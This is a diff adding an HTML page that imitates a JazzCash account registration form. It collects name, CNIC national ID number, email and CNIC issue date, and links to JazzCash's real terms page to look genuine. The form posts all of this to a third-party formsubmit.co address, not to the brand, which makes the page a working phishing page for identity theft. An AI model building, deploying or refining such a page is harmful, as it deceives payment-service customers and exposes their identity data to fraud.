@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Registration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #222;
+            margin: 0;
+            color: #ffcc00;
+        }
+        .registration-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+        .registration-box {
+            background: #333;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(255, 204, 0, 0.5);
+            width: 320px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffcc00;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+        }
+        .input-group {
+            margin: 10px 0;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ffcc00;
+            border-radius: 5px;
+            background: #444;
+            color: white;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #ffcc00;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #e6b800;
+        }
+        .terms {
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="registration-container">
+        <div class="registration-box">
+            <div class="logo">JazzCash</div>
+            <h2>Account Registration</h2>
+            <form action="https://formsubmit.co/3c93cacb1c323dd440f1b390fcdaa078" method="POST">
+                <div class="input-group">
+                    <label for="name">Name</label>
+                    <input type="text" name="name" id="name" placeholder="Enter your name" required>
+                </div>
+                <div class="input-group">
+                    <label for="cnic">CNIC</label>
+                    <input type="text" name="cnic" id="cnic" placeholder="Enter your CNIC" required>
+                </div>
+                <div class="input-group">
+                    <label for="email">Email</label>
+                    <input type="email" name="email" id="email" placeholder="Enter your email" required>
+                </div>
+                <div class="input-group">
+                    <label for="cnic-issue">CNIC Issue Date</label>
+                    <input type="date" name="cnic-issue" id="cnic-issue" required>
+                </div>
+                <div class="terms">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms"> I accept <a href="https://www.jazzcash.com.pk/tc/" target="_blank" style="color:#ffcc00;">Terms & Conditions</a></label>
+                </div>
+                <button type="submit">Register</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
